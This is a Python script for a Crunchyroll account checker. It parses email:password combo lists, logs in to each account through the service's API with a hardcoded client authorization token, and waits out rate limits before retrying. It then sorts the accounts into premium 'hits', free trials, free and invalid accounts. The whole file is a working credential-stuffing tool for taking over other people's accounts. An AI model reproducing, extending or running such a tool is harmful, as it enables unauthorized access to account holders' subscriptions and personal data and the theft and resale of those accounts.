#!/usr/bin/env python3


### Importing
from src import (
    sendRequest
)
import re
import time


### Some Global Variable
EMAILPASS_REGEX = r'[\w\.]+@[\w\.]+:[\S]+'
DEFAULT_HEADER = {
    "User-Agent": "Crunchyroll/3.47.0 Android/10 okhttp/4.12.0"
}
AUTH_TOKEN = "bC1wbGZ0bmtneWFycGZxaGpoOC06TVFZX3pDeGlOUFk1RUVPX0xQRk9VNFFaZ1ktWVVZRXM="


### Checker Class
class CrunchyrollChecker:

    def __init__(self, filename):
        self.apiUrl = "https://beta-api.crunchyroll.com/"
        self.headers = DEFAULT_HEADER
        self.auth = "Basic " + AUTH_TOKEN
        self.data = {
            "grant_type": "password",
            "scope": "offline_access"
        }
        self.filename = filename
    
    @classmethod
    def create(
        cls,
        filename : str
        ):
        self = CrunchyrollChecker(filename)
        self._resultFile()
        self._checker()

    def _checker(self):
        file = open(self.filename)
        for line in file.readlines():
            loginDetail = self._filterEmailPass(line)
            if loginDetail:
                self._letsLogin()
            else:
                continue
        file.close()
        self.hitFile.close()
        self.invalid.close()
    
    def _letsLogin(self):
        request = self._preparingLoginData()
        self._tryToLogin(request)
    
    def _preparingLoginData(self):
        data = dict(self.data)
        data['username'] = self.email
        data['password'] = self.password
        headers = dict(self.headers)
        headers["authorization"] = self.auth
        headers["Content-Type"] = "application/x-www-form-urlencoded"

        request = sendRequest.Request()
        request.setRequestData(
            self.apiUrl + "auth/v1/token",
            headers,
            data
        )

        return request

    def _tryToLogin(
            self,
            request : sendRequest.Request
        ):
        request.sendRequest()
        res = request.response

        if "error" in res:
            e = res["error"]
            if res["errorType"] == "http":

                if e.code == 401:
                    self._resultSaving('invalid')
                elif e.code == 429:
                    print("Too many Requests, Let me take a sleep for 10 seconds.")
                    time.sleep(10)
                    self._tryToLogin(request)
                else:
                    print(e)
                    self._resultSaving(error = f'Error in while trying to login {e}')

            else:
                self._resultSaving(error = f'Error in while trying to login {e}')

        else:
            try:
                accessToken = res['access_token']
            except KeyError:
                print(f'{self.email}:{self.password} Something went wrong!')
                self._resultSaving(error = f'Acces Token Not found {res}')
                print(res)
            else:
                if accessToken:
                    self._premiumChecker(accessToken)
                else:
                    print(f'{self.email}:{self.password} Something went wrong!')
                    print(res)
                    self._resultSaving(error = f'Acces Token is empty {res}')
    
    def _filterEmailPass(self, line):
        loginDetail = re.findall(EMAILPASS_REGEX, line)
        if loginDetail:
            login_info_parsed = loginDetail[0].split(':')
            if len(login_info_parsed) == 2:
                self.email, self.password = login_info_parsed
                return True
        return None
    
    def _resultFile(self):
        resultDir = 'result//'
        self.hitFile = open(f'{resultDir}hit.txt', 'a')
        self.freeFile = open(f'{resultDir}free.txt', 'a')
        self.invalid = open(f'{resultDir}invalid.txt', 'a')
        self.error = open(f'{resultDir}error.txt', 'a')
        self.trial = open(f'{resultDir}trial.txt', 'a')

    def _resultSaving(
        self,
        file = 'error',
        error = None,
        free_trial = False
        ):
        printMsg = f'{self.email}:{self.password}'
        if file == 'error':
            fileRefer = self.error
            printMsg += f' {error}'
            fileMsg = printMsg + '\n'
        elif file == 'invalid':
            fileRefer = self.invalid
            fileMsg = printMsg + '\n'
            printMsg += ' Invalid Login Credential'
        elif file == 'hit':
            fileMsg = printMsg + '\n'
            if free_trial:
                fileRefer = self.trial
                printMsg += ' Free Trial Found'
            else:
                fileRefer = self.hitFile
                printMsg += ' Hit Found' 
        else:
            fileRefer = self.freeFile
            fileMsg = printMsg + '\n'
            printMsg += ' Free Account Found'
        print(printMsg)
        fileRefer.write(fileMsg)
        fileRefer.flush()
    
    def _premiumChecker(self, accessToken):
        header = dict(self.headers)
        header["authorization"] = f"Bearer {accessToken}"
        externalID = self._getExternalID(header)
        if externalID:
            self._subscriptionChecker(header, externalID)
        return

    def _getExternalID(self, header):
        request = sendRequest.Request()
        request.sendRequestWithData(
            self.apiUrl + 'accounts/v1/me',
            header
        )
        res = request.response
        print(res)

        if "error" in res:
            self._resultSaving(error = f'Error while getting external id {res["error"]}')
        
        else:
            try:
                externalID = res['external_id']
            except KeyError:
                print(f'{self.email}:{self.password} Something went wrong! While getting externalID')
                print(res)
                self._resultSaving(file = 'free')
            else:
                return externalID

    def _subscriptionChecker(self, header, externalID):
        request = sendRequest.Request()
        request.sendRequestWithData(
            self.apiUrl + f'subs/v1/subscriptions/{externalID}/products',
            header
        )
        res = request.response
        print(res)

        if "error" in res:
            if res["errorType"] == "http" and res["error"].code == 404:
                self._resultSaving(file = 'free')

            else:
                self._resultSaving(error = f'Error while checking subscription {res["error"]}')
        
        else:
            if res['total']:
                free_trial = res['items'][0]['active_free_trial']
                self._resultSaving(
                    file = 'hit',
                    free_trial = free_trial
                )
            else:
                self._resultSaving(file = 'free')

